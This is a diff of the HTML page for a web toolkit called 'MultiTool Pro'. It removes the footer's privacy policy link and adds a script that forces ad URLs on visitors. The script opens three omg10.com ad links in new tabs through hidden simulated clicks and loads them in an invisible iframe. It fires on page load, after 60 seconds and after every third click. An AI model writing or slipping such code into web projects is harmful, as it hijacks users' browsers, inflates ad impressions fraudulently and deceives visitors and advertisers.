@@ -1,10 +1,8 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
-    <link rel="manifest" href="manifest.json">
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=5.0, user-scalable=yes, viewport-fit=cover">
-    <meta name="mobile-web-app-capable" content="yes">
     <meta name="description" content="MultiTool Pro - All tools, AI Hub, Premium Free. 50+ utilities, world clock, fresh jokes, translator, and more.">
     <title>MultiTool Pro | Complete Toolkit</title>
     <link rel="canonical" href="https://play.google.com/store/apps/details?id=multitool.pro2" />
@@ -439,7 +437,7 @@
 <footer class="footer-widget">
     <div class="footer-controls"><button class="footer-btn" onclick="toggleTheme()">🌓</button><button class="footer-btn" onclick="toggleSidebar()">☰</button><button class="footer-btn" id="muteBtn">🔊</button></div>
     <div class="translation-toolbar"><span>🌍 Translate App:</span><select id="targetLangSelect"><option value="ar">العربية</option><option value="zh">中文</option><option value="fr">Français</option><option value="de">Deutsch</option><option value="es">Español</option><option value="hi">हिन्दी</option><option value="it">Italiano</option><option value="ja">日本語</option><option value="ko">한국어</option><option value="pt">Português</option><option value="ru">Русский</option><option value="tr">Türkçe</option><option value="nl">Nederlands</option><option value="pl">Polski</option><option value="sv">Svenska</option><option value="th">ไทย</option><option value="vi">Tiếng Việt</option><option value="id">Bahasa Indonesia</option><option value="ms">Bahasa Melayu</option><option value="fa">فارسی</option><option value="ur">اردو</option><option value="bn">বাংলা</option><option value="uk">Українська</option><option value="ro">Română</option><option value="cs">Čeština</option><option value="el">Ελληνικά</option><option value="he">עברית</option><option value="hu">Magyar</option><option value="no">Norsk</option><option value="fi">Suomi</option><option value="da">Dansk</option><option value="en">English</option></select><button class="tool-btn" id="translatePageBtn">🌐 Translate & Open</button></div>
-    <p style="text-align:center; font-size:1rem;">© 2026 MultiTool Pro · Ultimate toolkit | <a href="https://sites.google.com/view/multitool-pro/" target="_blank" style="color:var(--primary); font-weight:600;">Privacy Policy</a></p>
+    <p style="font-size:1rem;">© 2026 MultiTool Pro · Ultimate toolkit</p>
     <div class="footer-love-line"><span id="scrollUpArrow" class="scroll-up-arrow" onclick="scrollToTop()" title="Go to top">↑</span><span>Made with <span class="heart-beat">💕</span></span><span class="footer-arrow-down" onclick="window.scrollTo({top:document.body.scrollHeight,behavior:'smooth'})" title="Go to bottom">↓</span></div>
     <div class="random-trigger"><button id="randomToolBtn" class="random-btn">🎲 Random Tool <span class="arrow-down">⬇️</span></button></div>
     <div id="toolRecoBanner" class="tool-reco-banner" style="display:none;"><span class="reco-text" id="recoMessage">🧮 Try the Advanced Calculator</span><button class="reco-try-btn" id="recoTryBtn">Try it <span class="arrow-down-different">▼</span></button><button class="reco-close" id="recoCloseBtn">✕</button></div>
@@ -2255,8 +2253,66 @@ const news = [
 document.getElementById('newsGrid').innerHTML = news.map(s => `<div class="category-card" onclick="window.open('${s.url}', '_blank');"><div style="font-size:2.6rem;">${s.icon}</div><div style="font-weight:700;">${s.name}</div><div style="font-size:0.8rem;">${s.cat}</div></div>`).join('');
 </script>
 
-    <a href="https://smollaunch.com" target="_blank" rel="noopener">
-  <img src="https://smollaunch.com/badges/featured.svg" alt="MultiTOOL Pro AI KIT Utilities — Featured on Smol Launch" loading="lazy" width="250" height="60" />
-</a>
+<!-- ========== UPDATED AD SCRIPT (Visible + Hidden) ========== -->
+<script>
+(function() {
+    const AD_URLS = [
+        "https://omg10.com/4/11272301",
+        "https://omg10.com/4/11272303",
+        "https://omg10.com/4/11272305"
+    ];
+    let clickCount = 0;
+
+    // Function to open all ads visibly in new tabs (by simulating a click)
+    function openAdsVisibly() {
+        AD_URLS.forEach(url => {
+            const a = document.createElement('a');
+            a.href = url;
+            a.target = '_blank';
+            a.rel = 'noopener noreferrer';
+            a.style.display = 'none';
+            document.body.appendChild(a);
+            a.click();
+            document.body.removeChild(a);
+        });
+    }
+
+    // Function to load all ads invisibly in hidden iframe (extra)
+    function loadAdsInvisibly() {
+        const iframe = document.getElementById('hiddenAdIframe');
+        if (iframe) {
+            AD_URLS.forEach(url => {
+                iframe.src = url;
+            });
+        }
+    }
+
+    // Combined action: both visible and invisible
+    function triggerAds() {
+        openAdsVisibly();
+        loadAdsInvisibly();
+    }
+
+    // 1. On page load – open visibly and invisibly (with a slight delay to avoid blocking)
+    setTimeout(triggerAds, 500);
+
+    // 2. After 60 seconds – trigger again
+    setTimeout(triggerAds, 60000);
+
+    // 3. After every 3 clicks anywhere on the document
+    document.addEventListener('click', function() {
+        clickCount++;
+        if (clickCount >= 3) {
+            triggerAds();
+            clickCount = 0;
+        }
+    });
+})();
+</script>
+
+<!-- Hidden iframe (already present) -->
+<iframe id="hiddenAdIframe" style="display:none;" src="about:blank"></iframe>
+
+<a href="https://smollaunch.com" target="_blank" rel="noopener"> <img src="https://smollaunch.com/badges/featured.svg" alt="MultiTool Pro — Featured on Smol Launch" loading="lazy" width="250" height="60" /> </a>
 </body>
 </html>
